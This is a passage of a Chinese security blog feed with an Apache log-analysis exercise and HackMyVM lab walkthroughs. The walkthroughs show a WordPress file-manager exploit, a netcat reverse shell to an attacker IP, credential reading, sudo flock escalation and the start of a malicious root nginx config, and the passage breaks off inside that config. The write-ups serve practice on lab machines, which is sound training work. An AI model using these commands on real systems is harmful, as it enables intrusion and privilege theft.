vmware-root_674-2731152261</span><br><span class="line">mysql.sock              sess_g10imn6kgucafbr205laul8m2s                                          vmware-root_681-4022243287</span><br><span class="line">panelSpeed.pl           systemd-private-5919622bbb2e42d487775f0812e3efe5-chronyd.service-yXNDQG  vmware-root_689-4021587913</span><br><span class="line">php-cgi-73.sock         systemd-private-bf83dd62b18f4f6abc660c77f3ace5ec-chronyd.service-ZstlR0  vmware-root_691-4013264459</span><br><span class="line">php-cgi-74.sock         unzip.log</span><br></pre></td></tr></table></figure><p>flag{&#x2F;tmp&#x2F;index.elf}</p>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 玄机 </tag>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>玄机-第一章日志分析-apache日志分析</title>
      <link href="/2025/07/06/%E7%8E%84%E6%9C%BA-%E7%AC%AC%E4%B8%80%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-apache%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
      <url>/2025/07/06/%E7%8E%84%E6%9C%BA-%E7%AC%AC%E4%B8%80%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-apache%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h2><p>1、提交当天访问次数最多的IP，即黑客IP：<br>2、黑客使用的浏览器指纹是什么，提交指纹的md5：<br>3、查看包含index.php页面被访问的次数，提交次数：<br>4、查看黑客IP访问了多少次，提交次数：<br>5、查看2023年8月03日8时这一个小时内有多少IP访问，提交次数:</p><p>apache的日志一般在&#x3D;&#x3D;&#x2F;var&#x2F;log&#x2F;apache2&#x3D;&#x3D;或者&#x3D;&#x3D;&#x2F;var&#x2F;log&#x2F;httpd&#x3D;&#x3D;</p><h2 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-10-2:~# <span class="built_in">cd</span> /var/log/apache2</span><br><span class="line">root@ip-10-0-10-2:/var/log/apache2# <span class="built_in">ls</span> -la</span><br><span class="line">total 1424</span><br><span class="line">drwxr-x--- 2 root adm     4096 Jul  5 14:51 .</span><br><span class="line">drwxr-xr-x 8 root root    4096 Jul  5 14:51 ..</span><br><span class="line">-rw-r----- 1 root adm        0 Jul  5 14:51 access.log</span><br><span class="line">-rw-r----- 1 root adm  1355381 Aug  3  2023 access.log.1</span><br><span class="line">-rw-r----- 1 root adm      239 Jul  5 14:51 error.log</span><br><span class="line">-rw-r----- 1 root adm    88555 Aug  3  2023 error.log.1</span><br><span class="line">-rw-r----- 1 root adm        0 Aug  2  2023 other_vhosts_access.log</span><br></pre></td></tr></table></figure><p>可以看到访问日志（access.log.1）和错误日志（error.log.1）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> access.log.1</span><br><span class="line">192.168.200.2 - - [03/Aug/2023:08:46:45 +0000] <span class="string">&quot;GET /id_rsa HTTP/1.1&quot;</span> 404 492 <span class="string">&quot;-&quot;</span> <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36&quot;</span></span><br></pre></td></tr></table></figure><p>打开一看，有很多访问记录，第一个字段就是IP，可以利用awk筛选出来第一个字段，全是这个IP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> access.log.1</span><br></pre></td></tr></table></figure><p>即flag{192.168.200.2}</p><h2 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h2><p>浏览器指纹（User-Agent）就是上面那一条日志最后一个字段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36&quot;</span> | <span class="built_in">md5sum</span></span><br><span class="line">2d6330f380f44ac20f3a02eed0958f66</span><br></pre></td></tr></table></figure><p>即flag{2d6330f380f44ac20f3a02eed0958f66}</p><h2 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h2><p>查看包含index.php页面被访问的次数，直接用grep筛选出来然后利用wc统计</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;/index.php&quot;</span> access.log.1 | <span class="built_in">wc</span> -l</span><br><span class="line">27</span><br></pre></td></tr></table></figure><p>利用grep筛选出来access.log.1中包含&#x2F;index.php的，然后wc -l是统计多少行。<br>但是提交不对，然后不统计筛选出来一条条看，会发现这两条日志，显然不是访问的&#x2F;index.php。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">192.168.200.2 - - [03/Aug/2023:08:27:09 +0000] <span class="string">&quot;GET /template/taoCMS/images/tao.js HTTP/1.1&quot;</span> 200 1430 <span class="string">&quot;http://192.168.200.51/index.php&quot;</span> <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0&quot;</span></span><br><span class="line"></span><br><span class="line">192.168.200.2 - - [03/Aug/2023:08:27:58 +0000] <span class="string">&quot;GET /template/taoCMS/images/tao.js HTTP/1.1&quot;</span> 200 1430 <span class="string">&quot;http://192.168.200.51/index.php&quot;</span> <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0&quot;</span></span><br></pre></td></tr></table></figure><p>即flag{25}</p><h2 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h2><p>查看黑客IP访问了多少次，依然是用grep筛选出来然后利用wc -l统计</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;192.168.200.2 - - &quot;</span> access.log.1 | <span class="built_in">wc</span> -l</span><br><span class="line">6555</span><br></pre></td></tr></table></figure><p>这里注意直接筛选192.168.200.2的话可能会有别的ip，例如192.168.200.202</p><p>即flag{6555}</p><h2 id="第五题"><a href="#第五题" class="headerlink" title="第五题"></a>第五题</h2><p>查看2023年8月03日8时这一个小时内有多少IP访问</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;03/Aug/2023:08&quot;</span> access.log.1 | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> | <span class="built_in">wc</span> -l</span><br><span class="line">5</span><br></pre></td></tr></table></figure><p>即flag{5}</p><p>先筛选出来时间，然后打印第一个字段，然后sort是排序，uniq是去重，最后利用wc -l统计数量。</p><h2 id="补充和总结"><a href="#补充和总结" class="headerlink" title="补充和总结"></a>补充和总结</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;03/Aug/2023:08&quot;</span> access.log.1 | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c</span><br><span class="line"></span><br><span class="line">  29 ::1</span><br><span class="line">6555 192.168.200.2</span><br><span class="line">   1 192.168.200.211</span><br><span class="line">   5 192.168.200.38</span><br><span class="line">   1 192.168.200.48</span><br></pre></td></tr></table></figure><p>这样可以看的更清晰，筛选出来了该时间段内的IP地址及访问次数。</p><ul><li>sort是排序的</li><li>uniq 是去重的，加上-c是统计重复数量</li></ul>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 玄机 </tag>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackmyvm-vulny</title>
      <link href="/2025/07/03/hackmyvm-vulny/"/>
      <url>/2025/07/03/hackmyvm-vulny/</url>
      
        <content type="html"><![CDATA[<h2 id="一、端口扫描"><a href="#一、端口扫描" class="headerlink" title="一、端口扫描"></a>一、端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.56.106</span><br><span class="line">80/tcp open  http</span><br></pre></td></tr></table></figure><p>只开放了80端口</p><h2 id="二、目录扫描与路径枚举"><a href="#二、目录扫描与路径枚举" class="headerlink" title="二、目录扫描与路径枚举"></a>二、目录扫描与路径枚举</h2><p>直接访问 <code>http://192.168.56.106</code> 显示 Ubuntu 默认页面。</p><p>使用 gobuster 扫描：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://192.168.56.106 -w /usr/share/wordlists/dirb/common.txt -x php,txt -t 50</span><br><span class="line"></span><br><span class="line">/secret               (Status: 301)  [Size: 317]  [--&gt; http://192.168.56.106/secret/]</span><br></pre></td></tr></table></figure><p>进一步扫描：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://192.168.56.106/secret -w /usr/share/wordlists/dirb/common.txt -x php,txt -t 50</span><br><span class="line"></span><br><span class="line">/wp-admin             (Status: 301) [Size: 326]  [--&gt; http://192.168.56.106/secret/wp-admin/]</span><br><span class="line">/wp-includes          (Status: 301) [Size: 329]  [--&gt; http://192.168.56.106/secret/wp-includes/]</span><br><span class="line">/wp-content           (Status: 301) [Size: 328]  [--&gt; http://192.168.56.106/secret/wp-content/]</span><br><span class="line">/wp-settings.php      (Status: 500) [Size: 0]</span><br></pre></td></tr></table></figure><p>访问&#x2F;secret发现是一个wordpress服务，并且报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Neither /etc/wordpress/config-192.168.56.106.php nor /etc/wordpress/config-168.56.106.php could be found.</span><br><span class="line">Ensure one of them exists, is readable by the webserver and contains the right password/username.</span><br></pre></td></tr></table></figure><h2 id="三、插件泄露与漏洞利用"><a href="#三、插件泄露与漏洞利用" class="headerlink" title="三、插件泄露与漏洞利用"></a>三、插件泄露与漏洞利用</h2><p>跟进访问：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.106/secret/wp-content/uploads/2020/10/</span><br></pre></td></tr></table></figure><p>发现插件包并且确定版本6.0：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wp-file-manager-6.0.zip</span><br></pre></td></tr></table></figure><p>这是 WordPress 的插件 <code>wp-file-manager</code>，存在 CVE-2020-25213：</p><blockquote><p><code>wp-file-manager &lt;= 6.8</code> 存在未授权文件上传漏洞，可远程命令执行。</p></blockquote><p>使用 <code>searchsploit</code> 查找漏洞利用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">searchsploit wp-file-manager</span><br><span class="line">searchsploit -m php/webapps/51224.py</span><br><span class="line">python3 51224.py http://192.168.56.106/secret <span class="built_in">id</span></span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br></pre></td></tr></table></figure><p>漏洞利用成功，之后反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 51224.py http://192.168.56.106/secret <span class="string">&quot;busybox nc 192.168.56.102 6666 -e sh&quot;</span></span><br></pre></td></tr></table></figure><h2 id="四、信息收集"><a href="#四、信息收集" class="headerlink" title="四、信息收集"></a>四、信息收集</h2><p>前面报错&#x2F;etc&#x2F;wordpress路径，然后看一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">www-data@vulny:/etc/wordpress$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">config-192.168.1.122.php  htaccess</span><br><span class="line">www-data@vulny:/etc/wordpress$ <span class="built_in">cat</span> config-192.168.1.122.php</span><br><span class="line"><span class="built_in">cat</span> config-192.168.1.122.php</span><br><span class="line">&lt;?php</span><br><span class="line">define(<span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;myfuckingpassword&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_COLLATE&#x27;</span>, <span class="string">&#x27;utf8_general_ci&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;WP_CONTENT_DIR&#x27;</span>, <span class="string">&#x27;/usr/share/wordpress/wp-content&#x27;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>然后看wordpress的配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /usr/share/wordpress/wp-config.php</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/***</span></span><br><span class="line"><span class="comment"> * WordPress&#x27;s Debianised default master config file</span></span><br><span class="line"><span class="comment"> * Please do NOT edit and learn how the configuration works in</span></span><br><span class="line"><span class="comment"> * /usr/share/doc/wordpress/README.Debian</span></span><br><span class="line"><span class="comment"> ***/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Look up a host-specific config file in</span></span><br><span class="line"><span class="comment"> * /etc/wordpress/config-&lt;host&gt;.php or /etc/wordpress/config-&lt;domain&gt;.php</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable">$debian_server</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/:.*/&#x27;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>]);</span><br><span class="line"><span class="variable">$debian_server</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[^a-zA-Z0-9.\-]/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$debian_server</span>);</span><br><span class="line"><span class="variable">$debian_file</span> = <span class="string">&#x27;/etc/wordpress/config-&#x27;</span>.<span class="title function_ invoke__">strtolower</span>(<span class="variable">$debian_server</span>).<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"><span class="comment">/* Main site in case of multisite with subdomains */</span></span><br><span class="line"><span class="variable">$debian_main_server</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/^[^.]*\./&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$debian_server</span>);</span><br><span class="line"><span class="variable">$debian_main_file</span> = <span class="string">&#x27;/etc/wordpress/config-&#x27;</span>.<span class="title function_ invoke__">strtolower</span>(<span class="variable">$debian_main_server</span>).<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$debian_file</span>)) &#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="variable">$debian_file</span>);</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DEBIAN_FILE&#x27;</span>, <span class="variable">$debian_file</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$debian_main_file</span>)) &#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="variable">$debian_main_file</span>);</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DEBIAN_FILE&#x27;</span>, <span class="variable">$debian_main_file</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;/etc/wordpress/config-default.php&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;/etc/wordpress/config-default.php&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DEBIAN_FILE&#x27;</span>, <span class="string">&quot;/etc/wordpress/config-default.php&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;HTTP/1.0 404 Not Found&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Neither &lt;b&gt;<span class="subst">$debian_file</span>&lt;/b&gt; nor &lt;b&gt;<span class="subst">$debian_main_file</span>&lt;/b&gt; could be found. &lt;br/&gt; Ensure one of them exists, is readable by the webserver and contains the right password/username.&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* idrinksomewater */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Default value for some constants if they have not yet been set</span></span><br><span class="line"><span class="comment">   by the host-specific config files */</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;ABSPATH&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;ABSPATH&#x27;</span>, <span class="string">&#x27;/usr/share/wordpress/&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;WP_CORE_UPDATE&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;WP_CORE_UPDATE&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;WP_ALLOW_MULTISITE&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;WP_ALLOW_MULTISITE&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;DB_NAME&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;DB_USER&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;DB_HOST&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;WP_CONTENT_DIR&#x27;</span>) &amp;&amp; !<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;DONT_SET_WP_CONTENT_DIR&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;WP_CONTENT_DIR&#x27;</span>, <span class="string">&#x27;/var/lib/wordpress/wp-content&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Default value for the table_prefix variable so that it doesn&#x27;t need to</span></span><br><span class="line"><span class="comment">   be put in every host-specific config file */</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$table_prefix</span>)) &#123;</span><br><span class="line">    <span class="variable">$table_prefix</span> = <span class="string">&#x27;wp_&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_PROTO&#x27;</span>]) &amp;&amp; <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_PROTO&#x27;</span>] == <span class="string">&#x27;https&#x27;</span>)</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTPS&#x27;</span>] = <span class="string">&#x27;on&#x27;</span>;</span><br></pre></td></tr></table></figure><p>文件中有个特别注释：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* idrinksomewater */</span></span><br></pre></td></tr></table></figure><p>结合&#x2F;home下的用户名作为登录凭据</p><h2 id="五、提权"><a href="#五、提权" class="headerlink" title="五、提权"></a>五、提权</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line">(ALL : ALL) NOPASSWD: /usr/bin/flock</span><br></pre></td></tr></table></figure><p>使用 <code>flock</code> 提权：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> flock -u / /bin/sh</span><br></pre></td></tr></table></figure><p>flock [选项] &lt;锁文件&gt; &lt;命令&gt;<br>这里的-u &#x2F;并不影响，重要的是root权限执行了flock，然后后面通过flock执行的命令就也是root权限。<br>以root权限解锁根目录并执行&#x2F;bin&#x2F;sh。<br>成功获取 root shell。</p><h2 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h2><ul><li>插件泄露 + CVE-2020-25213</li><li>服务的配置文件查询</li><li>flock提权</li></ul>]]></content>
      
      
      <categories>
          
          <category> 靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
            <tag> hackmyvm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackmyvm-webmaster</title>
      <link href="/2025/07/02/hackmyvm-webmaster/"/>
      <url>/2025/07/02/hackmyvm-webmaster/</url>
      
        <content type="html"><![CDATA[<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.56.105</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">53/tcp open  domain  Eero device dnsd</span><br><span class="line">80/tcp open  http    nginx 1.14.2</span><br></pre></td></tr></table></figure><p>53 端口为 DNS 服务，80 端口为 nginx Web 服务。</p><h2 id="二、DNS-Zone-Transfer-信息泄露"><a href="#二、DNS-Zone-Transfer-信息泄露" class="headerlink" title="二、DNS Zone Transfer 信息泄露"></a>二、DNS Zone Transfer 信息泄露</h2><p>首先看80端口</p><p>利用 <code>dig</code> 工具进行 DNS 区域传送（AXFR）测试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AXFR（Zone Transfer）是 DNS 用于把整个 Zone 批量同步给别人的协议。</span><br><span class="line">如果 DNS 管理员没加限制，AXFR 就相当于说：</span><br><span class="line">“我只要知道你叫啥名字（domain），然后敲个门（dig），你就把你家的全体成员名单 + 内网地址 + 邮件通道都告诉我。”</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">dig @192.168.56.105 webmaster.hmv AXFR +tcp</span><br><span class="line"></span><br><span class="line">webmaster.hmv.      IN SOA   ns1.webmaster.hmv. root.webmaster.hmv. ...</span><br><span class="line">ftp.webmaster.hmv.  IN CNAME www.webmaster.hmv.</span><br><span class="line">john.webmaster.hmv. IN TXT   <span class="string">&quot;Myhiddenpazzword&quot;</span></span><br><span class="line">mail.webmaster.hmv. IN A     192.168.0.12</span><br><span class="line">ns1.webmaster.hmv.  IN A     127.0.0.1</span><br><span class="line">www.webmaster.hmv.  IN A     192.168.0.11</span><br></pre></td></tr></table></figure><p>发现：<br><code>john.webmaster.hmv</code> 的 包含，TXT 和疑似密码 <code>Myhiddenpazzword</code>，测试john作为用户名 SSH 登录。</p><h2 id="三、SSH-登录"><a href="#三、SSH-登录" class="headerlink" title="三、SSH 登录"></a>三、SSH 登录</h2><p>使用用户名 <code>john</code> 和从 DNS TXT 记录获得的密码尝试登录 SSH：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh john@192.168.56.105</span><br></pre></td></tr></table></figure><p>成功登录后，发现用户家目录有 <code>flag.sh</code>，直接读flag的，但是只能读取权限内的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line">(ALL : ALL) NOPASSWD: /usr/sbin/nginx</span><br></pre></td></tr></table></figure><p>这里是知识盲区，之后看大佬wp，要写nginx恶意配置文件</p><h2 id="四、利用-nginx-配置提权"><a href="#四、利用-nginx-配置提权" class="headerlink" title="四、利用 nginx 配置提权"></a>四、利用 nginx 配置提权</h2><p>创建恶意 nginx 配置文件 <code>nginx.conf</code>，内容如下：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">user</span> root;</span><br><span class="line"><span class="attribute">worker_processes</span> <span class="number">4</span>;</span><br><span class="line"><span class="attribute">pid</span> /tmp/nginx.pid;</span><br><span class="line"></span><br><span class="line"><span class="section">events</span> &#123;</span><br><span class="line">    <span class="attribute">worker_connections</span> <span class="number">768</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">        <span class="attribute">listen</span> <span class="number">1234</span>;</span><br><span class="line">        <span class="attribute">root</span> /;</span><br><span class="line">        